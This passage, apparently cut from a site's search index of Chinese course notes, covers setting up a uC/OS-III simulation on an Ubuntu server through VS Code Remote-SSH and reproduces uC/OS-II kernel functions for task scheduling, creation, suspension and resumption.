\u6211\u770b\u5230\u4e4b\u540e\u90fd\u5feb\u54ed\u4e86\uff0c\u7ec8\u4e8e\u4e0d\u7528\u9000\u8bfe\u4e86:sob:\u3002\u628a\u8fd9\u4f4d\u5927\u4f6c\u7684\u9879\u76eeFork\u8fc7\u6765\u4ee5\u540e\uff0c\u56e0\u4e3a\u505a\u5b9e\u9a8c\u9700\u8981\u7ecf\u5e38\u8c03\u8bd5\uff0c\u6211\u628a\u547d\u4ee4\u884c\u7528Makefile\u518d\u7b80\u5316\u4e86\u4e00\u70b9\uff0c\u653e\u5728\u4e86 \u6211\u7684Github\u4e0a \u3002\u6b22\u8fce\u5927\u5bb6Star/Fork\uff0c~~\u6c42\u4f60\u4eec\u4e86~~\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.uCos%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/#2","text":"\u8981\u5b8c\u6210\u672c\u7bc7\u6587\u7ae0\u4e2d\u6240\u8bf4\u7684\u914d\u7f6e\u5de5\u4f5c\uff0c\u4f60\u9700\u8981\u6709 \u4e00\u53f0MacBook\u3002\u5176\u5b9e\u5565\u7535\u8111\u90fd\u884c\uff0c\u4f46\u6211\u4eec\u4e3b\u8981\u60f3\u89e3\u51b3\u7684\u8fd8\u662f\u5728Mac\u4e0a\u8fdb\u884cuC/OS\u4eff\u771f\u7684\u95ee\u9898\u3002 VS Code \u3002\u5176\u5b9e\u5176\u4ed6IDE\u3001\u7f16\u8f91\u5668\u53ea\u8981\u652f\u6301SSH\u8fde\u63a5\u4e5f\u90fd\u53ef\u4ee5\uff0c~~\u4f46\u6211\u89c9\u5f97VS Code\u5929\u4e0b\u7b2c\u4e00~~\u3002 VS Code \u63d2\u4ef6 Remote - SSH \uff0c\u5fae\u8f6f\u5b98\u65b9\u5f00\u53d1\u7684SSH\u63d2\u4ef6\u3002 \u4e00\u53f0Ubuntu\u670d\u52a1\u5668\u3002\u6211\u4f7f\u7528\u7684\u662f\u963f\u91cc\u4e91\u7684 \u5b66\u751f\u670d\u52a1\u5668 \uff0c\u4e00\u5e74\u53ea\u8981100\u591a\uff0c\u4f60\u4e70\u4e86\u4e0d\u5403\u4e8f\uff0c\u4f60\u4e70\u4e86\u4e0d\u4e0a\u5f53\u3002","title":"2. \u51c6\u5907\u5de5\u4f5c"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.uCos%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/#3","text":"","title":"3. \u914d\u7f6e\u6b65\u9aa4"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.uCos%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/#31","text":"\u5b89\u88c5CMake sudo apt install cmake \u4eceGithub\u4e0a\u4e0b\u8f7d\u6e90\u4ee3\u7801\u5230\u670d\u52a1\u5668\u3002 \u5728\u4f60\u60f3\u8981\u5b89\u88c5\u7684\u76ee\u5f55\u4e0b\u8f93\u5165\u547d\u4ee4 git clone https://github.com/CurrenWong/ucos3-posix.git \u8fdb\u5165\u9879\u76ee\u6587\u4ef6\u5939 cd ucos3-posix \u6784\u5efa\u9879\u76ee make \u6784\u5efa\u5b8c\u6210\u4ee5\u540e\u4f1a\u5728\u6700\u540e\u4e00\u884c\u8f93\u51fa Done \u3002 \u8fd0\u884c\u9879\u76ee\u68c0\u67e5\u662f\u5426\u5b89\u88c5\u6210\u529f make run \u770b\u5230 uCos-III is running \u65f6\u5c31\u8bf4\u660e\u914d\u7f6e\u5b8c\u6210\u4e86:sparkles:\u3002\u7528Ctrl-C\u505c\u6389\u8fd0\u884c\u4e2d\u7684\u9879\u76ee\u5c31\u53ef\u4ee5\u4e86\u3002 \u4f46\u662f\uff0c\u5728\u547d\u4ee4\u884c\u754c\u9762\u91cc\u5199\u4ee3\u7801\u4f53\u9a8c\u8fd8\u662f\u7a0d\u5fae\u5dee\u4e86\u4e00\u70b9\uff0c\u9664\u975e\u662f\u7cbe\u901aVim\u7684\u5927\u4f6c\u3002\u6240\u4ee5\u63a5\u4e0b\u6765\u6211\u4eec\u4f1a\u901a\u8fc7\u914d\u7f6eVS Code\u6765\u5b9e\u73b0\u8fdc\u7a0bSSH\uff0c\u8fd9\u6837\u5c31\u80fd\u591f\u5728\u672c\u5730\u7684VS Code\u4e0a\u5199\u4ee3\u7801\uff0c\u5e76\u4e14\u5728\u670d\u52a1\u5668\u4e0a\u8fd0\u884c\u4e86\u3002","title":"3.1. \u914d\u7f6e\u670d\u52a1\u5668"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.uCos%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/#32-vs-code","text":"\u4e0b\u8f7dRemote ssh\u63d2\u4ef6 \u5728\u6269\u5c55\u5546\u5e97\u4e2d\u641c\u7d22 remote ssh \uff0c\u51fa\u6765\u7b2c\u4e00\u4e2a\u5c31\u662f\u6211\u4eec\u9700\u8981\u7684\u63d2\u4ef6\uff0c\u70b9\u51fbInstall\u5b89\u88c5\u5373\u53ef\u3002 \u5982\u679c\u6ca1\u6709\u88c5C\u8bed\u8a00\u6269\u5c55\u7684\u8bdd\uff0c\u518d\u88c5\u4e00\u4e2a C/C++ \uff0c\u4e5f\u662f\u5fae\u8f6f\u5b98\u65b9\u7684\u63d2\u4ef6\u3002 \u914d\u7f6essh\u8fde\u63a5 \u4e0b\u8f7d\u597dremote ssh\u4ee5\u540e\uff0c\u5de6\u4e0b\u89d2\u4f1a\u6709\u4e00\u4e2a\u7eff\u8272\u7684\u6807\u8bb0\uff0c\u70b9\u51fb\u8fd9\u4e2a\u6807\u8bb0\u3002 \u8fd9\u65f6\u4f1a\u5f39\u51fa\u4e00\u4e2a\u83dc\u5355\uff0c\u8ba9\u4f60\u9009\u62e9\u505a\u4ec0\u4e48\u64cd\u4f5c\u3002\u4e3a\u4e86\u4e4b\u540e\u8fde\u63a5\u65b9\u4fbf\uff0c\u6211\u4eec\u76f4\u63a5\u628a\u7528\u6237\u540d\u548c\u670d\u52a1\u5668IP\u5199\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u3002 \u9996\u5148\u9009\u62e9Open Configure File \u7136\u540e\u9009\u62e9 xxx/.ssh/config \u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u586b\u5165\u4f60\u7684\u4e3b\u673a\u6635\u79f0\uff08Host\uff09\u3001\u670d\u52a1\u5668IP\uff08HostName\uff09\u548c\u767b\u9646\u7528\u6237\u540d\uff08User\uff09 \u4fdd\u5b58\u4ee5\u540e\uff0c\u518d\u70b9\u51fb\u4e00\u4e0b\u7a97\u53e3\u5de6\u4e0b\u89d2\u7684\u7eff\u8272\u6807\u8bb0\uff0c\u5f39\u51faVs Code\u7684\u547d\u4ee4\u7a97\u53e3\uff0c\u9009\u62e9 Connect to Host \uff0c\u5728\u9009\u62e9\u6211\u4eec\u521a\u521a\u521b\u5efa\u7684\u4e3b\u673a\u3002 \u8fd9\u65f6\u4f1a\u5f39\u51fa\u4e00\u4e2a\u65b0\u7684\u7a97\u53e3\uff0c\u8f93\u5165\u8fde\u63a5\u5bc6\u7801\u4ee5\u540e\uff0c\u6211\u4eec\u5c31\u5927\u529f\u544a\u6210\u4e86\u3002 \u8fdb\u5165\u6211\u4eec\u5728\u670d\u52a1\u5668\u4e0a\u914d\u7f6e\u7684uC/OS\u8def\u5f84\uff0c\u7f16\u8f91app.c\uff0c\u6109\u5feb\u5730\u8fdb\u884cuC/OS\u4eff\u771f\u5427\uff01:+1:\u3002 \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3.2. \u914d\u7f6eVS Code"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/10.uCos-ii%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E4%BB%A3%E7%A0%81/","text":"uCos-ii\u4e2d\u7684\u4efb\u52a1\u4ee3\u7801 # \u76ee\u5f55 # uCos-ii\u4e2d\u7684\u4efb\u52a1\u4ee3\u7801 \u76ee\u5f55 1. \u80cc\u666f 2. \u4ee3\u7801 2.1. \u4efb\u52a1\u8c03\u5ea6\u51fd\u6570 2.2. \u4efb\u52a1\u521d\u59cb\u5316\u51fd\u6570 2.3. \u4efb\u52a1\u521d\u59cb\u5316\u51fd\u6570\u6269\u5c55 2.4. \u4efb\u52a1\u6302\u8d77\u51fd\u6570 2.5. \u6062\u590d\u4efb\u52a1\u6302\u8d77\u51fd\u6570 1. \u80cc\u666f # \u6700\u8fd1\u5feb\u8981\u671f\u672b\u8003\u8bd5\u4e86\uff0c\u6211\u628auCos-ii\u4e2d\u7684\u4efb\u52a1\u4ee3\u7801\u6574\u7406\u4e86\u4e00\u4e0b\uff0c\u6574\u7406\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\u3002 2. \u4ee3\u7801 # 2.1. \u4efb\u52a1\u8c03\u5ea6\u51fd\u6570 # void OS_Sched (void) { #if OS_CRITICAL_METHOD == 3 /* Allocate storage for CPU status register */ OS_CPU_SR cpu_sr; #endif INT8U y; OS_ENTER_CRITICAL(); if ((OSIntNesting == 0) && (OSLockNesting == 0)) { /* Sched. only if all ISRs done & not locked */ y = OSUnMapTbl[OSRdyGrp]; /* Get pointer to HPT ready to run */ OSPrioHighRdy = (INT8U)((y << 3) + OSUnMapTbl[OSRdyTbl[y]]); if (OSPrioHighRdy != OSPrioCur) { /* No Ctx Sw if current task is highest rdy */ OSTCBHighRdy = OSTCBPrioTbl[OSPrioHighRdy]; OSCtxSwCtr++; /* Increment context switch counter */ OS_TASK_SW(); /* Perform a context switch */ } } OS_EXIT_CRITICAL(); } 2.2. \u4efb\u52a1\u521d\u59cb\u5316\u51fd\u6570 # INT8U OSTaskCreate ( void (*task)(void *pd), void *pdata, OS_STK *ptos, INT8U prio) { #if OS_CRITICAL_METHOD == 3 /* Allocate storage for CPU status register */ OS_CPU_SR cpu_sr; #endif OS_STK *psp; INT8U err; #if OS_ARG_CHK_EN > 0 if (prio > OS_LOWEST_PRIO) { /* Make sure priority is within allowable range */ return (OS_PRIO_INVALID); } #endif OS_ENTER_CRITICAL(); if (OSTCBPrioTbl[prio] == (OS_TCB *)0) { /* Make sure task doesn't already exist at this priority */ OSTCBPrioTbl[prio] = (OS_TCB *)1; /* Reserve the priority to prevent others from doing ... */ /* ... the same thing until task is created. */ OS_EXIT_CRITICAL(); psp = (OS_STK *)OSTaskStkInit(task, pdata, ptos, 0); /* Initialize the task's stack */ err = OS_TCBInit(prio, psp, (OS_STK *)0, 0, 0, (void *)0, 0); if (err == OS_NO_ERR) { OS_ENTER_CRITICAL(); OSTaskCtr++; /* Increment the #tasks counter */ OS_EXIT_CRITICAL(); if (OSRunning == TRUE) { /* Find highest priority task if multitasking has started */ OS_Sched(); } } else { OS_ENTER_CRITICAL(); OSTCBPrioTbl[prio] = (OS_TCB *)0;/* Make this priority available to others */ OS_EXIT_CRITICAL(); } return (err); } OS_EXIT_CRITICAL(); return (OS_PRIO_EXIST); } 2.3. \u4efb\u52a1\u521d\u59cb\u5316\u51fd\u6570\u6269\u5c55 # Description: This function is used to have uC/OS-II manage the execution of a task. Tasks can either be created prior to the start of multitasking or by a running task. A task cannot be created by an ISR. This function is similar to OSTaskCreate() except that it allows additional information about a task to be specified. INT8U OSTaskCreateExt (void (*task)(void *pd), void *pdata, OS_STK *ptos, INT8U prio, INT16U id, OS_STK *pbos, INT32U stk_size, void *pext, INT16U opt) { #if OS_CRITICAL_METHOD == 3 /* Allocate storage for CPU status register */ OS_CPU_SR cpu_sr; #endif OS_STK *psp; INT8U err; #if OS_ARG_CHK_EN > 0 if (prio > OS_LOWEST_PRIO) { /* Make sure priority is within allowable range */ return (OS_PRIO_INVALID); } #endif OS_ENTER_CRITICAL(); if (OSTCBPrioTbl[prio] == (OS_TCB *)0) { /* Make sure task doesn't already exist at this priority */ OSTCBPrioTbl[prio] = (OS_TCB *)1; /* Reserve the priority to prevent others from doing ... */ /* ... the same thing until task is created. */ OS_EXIT_CRITICAL(); if (((opt & OS_TASK_OPT_STK_CHK) != 0x0000) || /* See if stack checking has been enabled */ ((opt & OS_TASK_OPT_STK_CLR) != 0x0000)) { /* See if stack needs to be cleared */ #if OS_STK_GROWTH == 1 (void)memset(pbos, 0, stk_size * sizeof(OS_STK)); #else (void)memset(ptos, 0, stk_size * sizeof(OS_STK)); #endif } psp = (OS_STK *)OSTaskStkInit(task, pdata, ptos, opt); /* Initialize the task's stack */ err = OS_TCBInit(prio, psp, pbos, id, stk_size, pext, opt); if (err == OS_NO_ERR) { OS_ENTER_CRITICAL(); OSTaskCtr++; /* Increment the #tasks counter */ OS_EXIT_CRITICAL(); if (OSRunning == TRUE) { /* Find HPT if multitasking has started */ OS_Sched(); } } else { OS_ENTER_CRITICAL(); OSTCBPrioTbl[prio] = (OS_TCB *)0; /* Make this priority avail. to others */ OS_EXIT_CRITICAL(); } return (err); } OS_EXIT_CRITICAL(); return (OS_PRIO_EXIST); } 2.4. \u4efb\u52a1\u6302\u8d77\u51fd\u6570 # INT8U OSTaskSuspend (INT8U prio) { #if OS_CRITICAL_METHOD == 3 /* Allocate storage for CPU status register */ OS_CPU_SR cpu_sr; #endif BOOLEAN self; OS_TCB *ptcb; #if OS_ARG_CHK_EN > 0 if (prio == OS_IDLE_PRIO) { /* Not allowed to suspend idle task */ return (OS_TASK_SUSPEND_IDLE); } if (prio >= OS_LOWEST_PRIO && prio != OS_PRIO_SELF) { /* Task priority valid ? */ return (OS_PRIO_INVALID); } #endif OS_ENTER_CRITICAL(); if (prio == OS_PRIO_SELF) { /* See if suspend SELF */ prio = OSTCBCur->OSTCBPrio; self = TRUE; } else if (prio == OSTCBCur->OSTCBPrio) { /* See if suspending self */ self = TRUE; } else { self = FALSE; /* No suspending another task */ } ptcb = OSTCBPrioTbl[prio]; if (ptcb == (OS_TCB *)0) { /* Task to suspend must exist */ OS_EXIT_CRITICAL(); return (OS_TASK_SUSPEND_PRIO); } if ((OSRdyTbl[ptcb->OSTCBY] &= ~ptcb->OSTCBBitX) == 0x00) { /* Make task not ready */ OSRdyGrp &= ~ptcb->OSTCBBitY; } ptcb->OSTCBStat |= OS_STAT_SUSPEND; /* Status of task is 'SUSPENDED' */ OS_EXIT_CRITICAL(); if (self == TRUE) { /* Context switch only if SELF */ OS_Sched(); } return (OS_NO_ERR); } 2.5. \u6062\u590d\u4efb\u52a1\u6302\u8d77\u51fd\u6570 # INT8U OSTaskResume (INT8U prio) { #if OS_CRITICAL_METHOD == 3 /* Allocate storage for CPU status register */ OS_CPU_SR cpu_sr; #endif OS_TCB *ptcb; #if OS_ARG_CHK_EN > 0 if (prio >= OS_LOWEST_PRIO) { /* Make sure task priority is valid */ return (OS_PRIO_INVALID); } #endif OS_ENTER_CRITICAL(); ptcb = OSTCBPrioTbl[prio]; if (ptcb == (OS_TCB *)0) { /* Task to suspend must exist */ OS_EXIT_CRITICAL(); return (OS_TASK_RESUME_PRIO); } if ((ptcb->OSTCBStat & OS_STAT_SUSPEND) != OS_STAT_RDY) { /* Task must be suspended */ if (((ptcb->OSTCBStat &= ~OS_STAT_SUSPEND) == OS_STAT_RDY) && /* Remove suspension */ (ptcb->OSTCBDly == 0)) { /* Must not be delayed */ OSRdyGrp |= ptcb->OSTCBBitY; /* Make task ready to run */ OSRdyTbl[ptcb->OSTCBY] |= ptcb->OSTCBBitX; OS_EXIT_CRITICAL(); OS_Sched(); } else { OS_EXIT_CRITICAL(); } return (OS_NO_ERR); } OS_EXIT_CRITICAL(); return (OS_TASK_NOT_SUSPENDED); } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"10.uCos ii\u4e2d\u7684\u4efb\u52a1\u4ee3\u7801"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/10.uCos-ii%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E4%BB%A3%E7%A0%81/#ucos-ii","text":"","title":"uCos-ii\u4e2d\u7684\u4efb\u52a1\u4ee3\u7801"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/10.uCos-ii%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E4%BB%A3%E7%A0%81/#_1","text":"uCos-ii\u4e2d\u7684\u4efb\u52a1\u4ee3\u7801 \u76ee\u5f55 1. \u80cc\u666f 2. \u4ee3\u7801 2.1. \u4efb\u52a1\u8c03\u5ea6\u51fd\u6570 2.2. \u4efb\u52a1\u521d\u59cb\u5316\u51fd\u6570 2.3. \u4efb\u52a1\u521d\u59cb\u5316\u51fd\u6570\u6269\u5c55 2.4. \u4efb\u52a1\u6302\u8d77\u51fd\u6570 2.5. \u6062\u590d\u4efb\u52a1\u6302\u8d77\u51fd\u6570","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/10.uCos-ii%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E4%BB%A3%E7%A0%81/#1","text":"\u6700\u8fd1\u5feb\u8981\u671f\u672b\u8003\u8bd5\u4e86\uff0c\u6211\u628auCos-ii\u4e2d\u7684\u4efb\u52a1\u4ee3\u7801\u6574\u7406\u4e86\u4e00\u4e0b\uff0c\u6574\u7406\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/10.uCos-ii%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E4%BB%A3%E7%A0%81/#2","text":"","title":"2. \u4ee3\u7801"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/10.uCos-ii%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E4%BB%A3%E7%A0%81/#21","text":"void OS_Sched (void) { #if OS_CRITICAL_METHOD == 3 /* Allocate storage for CPU status register */ OS_CPU_SR cpu_sr; #endif INT8U y; OS_ENTER_CRITICAL(); if ((OSIntNesting == 0) && (OSLockNesting == 0)) { /* Sched. only if all ISRs done & not locked */ y = OSUnMapTbl[OSRdyGrp]; /* Get pointer to HPT ready to run */ OSPrioHighRdy = (INT8U)((y << 3) + OSUnMapTbl[OSRdyTbl[y]]); if (OSPrioHighRdy != OSPrioCur) { /* No Ctx Sw if current task is highest rdy */ OSTCBHighRdy = OSTCBPrioTbl[OSPrioHighRdy]; OSCtxSwCtr++; /* Increment context switch counter */ OS_TASK_SW(); /* Perform a context switch */ } } OS_EXIT_CRITICAL(); }","title":"2.1. \u4efb\u52a1\u8c03\u5ea6\u51fd\u6570"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/10.uCos-ii%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E4%BB%A3%E7%A0%81/#22","text":"INT8U OSTaskCreate ( void (*task)(void *pd), void *pdata, OS_STK *ptos, INT8U prio) { #if OS_CRITICAL_METHOD == 3 /* Allocate storage for CPU status register */ OS_CPU_SR cpu_sr; #endif OS_STK *psp; INT8U err; #if OS_ARG_CHK_EN > 0 if (prio > OS_LOWEST_PRIO) { /* Make sure priority is within allowable range */ return (OS_PRIO_INVALID); } #endif OS_ENTER_CRITICAL(); if (OSTCBPrioTbl[prio] == (OS_TCB *)0) { /* Make sure task doesn't already exist at this priority */ OSTCBPrioTbl[prio] = (OS_TCB *)1; /* Reserve the priority to prevent others from doing ... */ /* ... the same thing until task is created. */ OS_EXIT_CRITICAL(); psp = (OS_STK *)OSTaskStkInit(task, pdata, ptos, 0); /* Initialize the task's stack */ err = OS_TCBInit(prio, psp, (OS_STK *)0, 0, 0, (void *)0, 0); if (err == OS_NO_ERR) { OS_ENTER_CRITICAL(); OSTaskCtr++; /* Increment the #tasks counter */ OS_EXIT_CRITICAL(); if (OSRunning == TRUE) { /* Find highest priority task if multitasking has started */ OS_Sched(); } } else { OS_ENTER_CRITICAL(); OSTCBPrioTbl[prio] = (OS_TCB *)0;/* Make this priority available to others */ OS_EXIT_CRITICAL(); } return (err); } OS_EXIT_CRITICAL(); return (OS_PRIO_EXIST); }","title":"2.2. \u4efb\u52a1\u521d\u59cb\u5316\u51fd\u6570"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/10.uCos-ii%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E4%BB%A3%E7%A0%81/#23","text":"Description: This function is used to have uC/OS-II manage the execution of a task. Tasks can either be created prior to the start of multitasking or by a running task. A task cannot be created by an ISR. This function is similar to OSTaskCreate() except that it allows additional information about a task to be specified. INT8U OSTaskCreateExt (void (*task)(void *pd), void *pdata, OS_STK *ptos, INT8U prio, INT16U id, OS_STK *pbos, INT32U stk_size, void *pext, INT16U opt) { #if OS_CRITICAL_METHOD == 3 /* Allocate storage for CPU status register */ OS_CPU_SR cpu_sr; #endif OS_STK *psp; INT8U err; #if OS_ARG_CHK_EN > 0 if (prio > OS_LOWEST_PRIO) { /* Make sure priority is within allowable range */ return (OS_PRIO_INVALID); } #endif OS_ENTER_CRITICAL(); if (OSTCBPrioTbl[prio] == (OS_TCB *)0) { /* Make sure task doesn't already exist at this priority */ OSTCBPrioTbl[prio] = (OS_TCB *)1; /* Reserve the priority to prevent others from doing ... */ /* ... the same thing until task is created. */ OS_EXIT_CRITICAL(); if (((opt & OS_TASK_OPT_STK_CHK) != 0x0000) || /* See if stack checking has been enabled */ ((opt & OS_TASK_OPT_STK_CLR) != 0x0000)) { /* See if stack needs to be cleared */ #if OS_STK_GROWTH == 1 (void)memset(pbos, 0, stk_size * sizeof(OS_STK)); #else (void)memset(ptos, 0, stk_size * sizeof(OS_STK)); #endif } psp = (OS_STK *)OSTaskStkInit(task, pdata, ptos, opt); /* Initialize the task's stack */ err = OS_TCBInit(prio, psp, pbos, id, stk_size, pext, opt); if (err == OS_NO_ERR) { OS_ENTER_CRITICAL(); OSTaskCtr++; /* Increment the #tasks counter */ OS_EXIT_CRITICAL(); if (OSRunning == TRUE) { /* Find HPT if multitasking has started */ OS_Sched(); } } else { OS_ENTER_CRITICAL(); OSTCBPrioTbl[prio] = (OS_TCB *)0; /* Make this priority avail. to others */ OS_EXIT_CRITICAL(); } return (err); } OS_EXIT_CRITICAL(); return (OS_PRIO_EXIST); }","title":"2.3. \u4efb\u52a1\u521d\u59cb\u5316\u51fd\u6570\u6269\u5c55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/10.uCos-ii%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E4%BB%A3%E7%A0%81/#24","text":"INT8U OSTaskSuspend (INT8U prio) { #if OS_CRITICAL_METHOD == 3 /* Allocate storage for CPU status register */ OS_CPU_SR cpu_sr; #endif BOOLEAN self; OS_TCB *ptcb; #if OS_ARG_CHK_EN > 0 if (prio == OS_IDLE_PRIO) { /* Not allowed to suspend idle task */ return (OS_TASK_SUSPEND_IDLE); } if (prio >= OS_LOWEST_PRIO && prio != OS_PRIO_SELF) { /* Task priority valid ? */ return (OS_PRIO_INVALID); } #endif OS_ENTER_CRITICAL(); if (prio == OS_PRIO_SELF) { /* See if suspend SELF */ prio = OSTCBCur->OSTCBPrio; self = TRUE; } else if (prio == OSTCBCur->OSTCBPrio) { /* See if suspending self */ self = TRUE; } else { self = FALSE; /* No suspending another task */ } ptcb = OSTCBPrioTbl[prio]; if (ptcb == (OS_TCB *)0) { /* Task to suspend must exist */ OS_EXIT_CRITICAL(); return (OS_TASK_SUSPEND_PRIO); } if ((OSRdyTbl[ptcb->OSTCBY] &= ~ptcb->OSTCBBitX) == 0x00) { /* Make task not ready */ OSRdyGrp &= ~ptcb->OSTCBBitY; } ptcb->OSTCBStat |= OS_STAT_SUSPEND; /* Status of task is 'SUSPENDED' */ OS_EXIT_CRITICAL(); if (self == TRUE) { /* Context switch only if SELF */ OS_Sched(); } return (OS_NO_ERR); }","title":"2.4. \u4efb\u52a1\u6302\u8d77\u51fd\u6570"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/10.uCos-ii%E4%B8%AD%E7%9A%84%E4%BB%BB%E5%8A%A1%E4%BB%A3%E7%A0%81/#25","text":"INT8U OSTaskResume (INT8U prio) { #if OS_CRITICAL_METHOD == 3 /* Allocate storage for CPU status register */ OS_CPU_SR cpu_sr; #endif OS_TCB *ptcb; #if OS_ARG_CHK_EN > 0 if (prio >= OS_LOWEST_PRIO) { /* Make sure task priority is valid */ return (OS_PRIO_INVALID); } #endif OS_ENTER_CRITICAL(); ptcb = OSTCBPrioTbl[prio]; if (ptcb == (OS_TCB *)0) { /* Task to suspend must exist */ OS_EXIT_CRITICAL(); return (OS_TASK_RESUME_PRIO); } if ((ptcb->OSTCBStat & OS_STAT_SUSPEND) != OS_STAT_RDY) { /* Task must be suspended */ if (((ptcb->OSTCBStat &= ~OS_STAT_SUSPEND) == OS_STAT_RDY) && /* Remove suspension */ (ptcb->OSTCBDly == 0)) { /* Must not be delayed */ OSRdyGrp |= ptcb->OSTCBBitY; /* Make task ready to run */ OSRdyTbl[ptcb->OSTCBY] |= ptcb->OSTCBBitX; OS_EXIT_CRITICAL(); OS_Sched(); } else { OS_EXIT_CRITICAL(); } return (OS_NO_ERR); } OS_EXIT_CRITICAL(); return (OS_TASK_NOT_SUSPENDED); } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.5. \u6062\u590d\u4efb\u52a1\u6302\u8d77\u51fd\u6570"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/2.%E4%BC%98%E5%85%88%E7%BA%A7%E5%8F%8D%E8%BD%AC%E4%B8%8E%E4%B8%AD%E6%96%AD%E6%9C%BA%E5%88%B6/","text":"\u4f18\u5148\u7ea7\u53cd\u8f6c\u4e0e\u4e2d\u65ad\u673a\u5236 # \u76ee\u5f55 # \u4f18\u5148\u7ea7\u53cd\u8f6c\u4e0e\u4e2d\u65ad\u673a\u5236 \u76ee\u5f55 1. \u80cc\u666f 2. \u4f18\u5148\u7ea7\u53cd\u8f6c 2.1. \u4f18\u5148\u7ea7\u53cd\u8f6c 2.2. \u4f18\u5148\u7ea7\u7ee7\u627f\u548c\u4f18\u5148\u7ea7\u5929\u82b1\u677f\u7b56\u7565 2.2.1. \u4f18\u5148\u7ea7\u7ee7\u627f 2.2.2. \u4f18\u5148\u7ea7\u5929\u82b1\u677f 3. \u4e2d\u65ad\u673a\u5236 3.1. \u5916\u90e8\u4e2d\u65ad 3.2. \u5185\u90e8\u4e2d\u65ad 3.3. \u8f6f\u4ef6\u4e2d\u65ad 4. \u53c2\u8003\u6587\u732e 1. \u80cc\u666f # \u4eca\u5929\u770b \u300a\u03bcC/OS-III\u6e90\u7801\u5206\u6790\u7b14\u8bb0\u300b \u7684\u65f6\u5019\u5b66\u4e86 \u4f18\u5148\u7ea7\u53cd\u8f6c 